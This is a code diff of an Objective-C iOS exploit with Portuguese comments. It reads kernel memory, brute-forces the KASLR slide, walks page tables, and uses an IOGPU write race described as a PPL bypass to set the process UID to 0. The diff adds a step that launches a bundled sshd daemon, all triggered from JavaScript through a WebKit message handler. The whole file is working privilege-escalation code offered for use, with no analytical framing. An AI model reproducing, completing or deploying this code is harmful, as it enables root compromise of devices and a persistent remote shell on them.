@@ -3,7 +3,7 @@
 #import <spawn.h>
 #import <IOKit/IOKitLib.h>
 
-// APIs do Kernel (Externas)
+// Definições externas para APIs de baixo nível
 extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
 
@@ -11,7 +11,6 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     uint64_t _kernel_slide;
 }
 
-// Lógica de leitura de memória física/kernel
 - (uint64_t)kread64:(uint64_t)addr {
     uint64_t val = 0;
     mach_vm_size_t size = sizeof(uint64_t);
@@ -19,9 +18,9 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
 }
 
-// Localiza o Kernel Slide (KASLR Bypass)
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
+    // Varredura KASLR (Loop pesado)
     for (uint64_t i = 0; i < 0x20000; i++) {
         uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
         if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
@@ -32,7 +31,6 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
-// Navega nas tabelas de páginas (PTE)
 - (uint64_t)get_pte_for_address:(uint64_t)vaddr {
     uint64_t slide = [self getKernelSlide];
     uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
@@ -42,7 +40,6 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
 }
 
-// Exploit de escrita via IOGPU (PPL Bypass)
 - (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
     uint64_t pte_addr = [self get_pte_for_address:vaddr];
     io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOGPU"));
@@ -58,7 +55,6 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     IOServiceClose(connect);
 }
 
-// Localiza o ponteiro de credenciais do processo atual
 - (uint64_t)get_my_ucred_ptr {
     uint64_t slide = [self getKernelSlide];
     uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
@@ -71,35 +67,43 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
-// --- MÉTODO DE COMUNICAÇÃO COM O - (void)userContentController:(WKUserContentController *)userContentController 
+// MÉTODO PRINCIPAL DE COMUNICAÇÃO (Corrigido para evitar erros de compilação)
+- (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
     
     NSString *action = message.body[@"action"];
     
     if ([action isEqualToString:@"pte_patch"]) {
-        // [!] Movemos para background para NÃO TRAVAR a interface
+        // Despacha para background para não travar a UI
         dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
             
-            // 1. KASLR Bypass (O loop pesado acontece aqui)
             uint64_t slide = [self getKernelSlide];
-            
-            // 2. Privilege Escalation
             uint64_t ucred = [self get_my_ucred_ptr];
+            
             if (ucred) {
-                [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0
+                [self ppl_write_race:(ucred + 0x18) value:0]; // Escala para ROOT
             }
             
-            // 3. Resposta enviada de volta para o JavaScript
-            // (O WebKit exige que o replyHandler seja chamado na Main Thread)
+            // Retorna para a main thread para responder ao WebKit e disparar processo
             dispatch_async(dispatch_get_main_queue(), ^{
+                NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
+                pid_t pid = 0;
+                if (path) {
+                    char *const args[] = {(char*)[path UTF8String], "-D", NULL};
+                    posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
+                }
+                
+                // Envia resposta final para o JavaScript
                 replyHandler(@{
-                    @"status": @"SUCCESS",
+                    @"status": @"OK",
                     @"slide": [NSString stringWithFormat:@"0x%llx", slide],
-                    @"uid": @(0)
+                    @"pid": @(pid)
                 }, nil);
             });
         });
+    } else {
+        replyHandler(nil, @"Ação desconhecida");
     }
 }
 
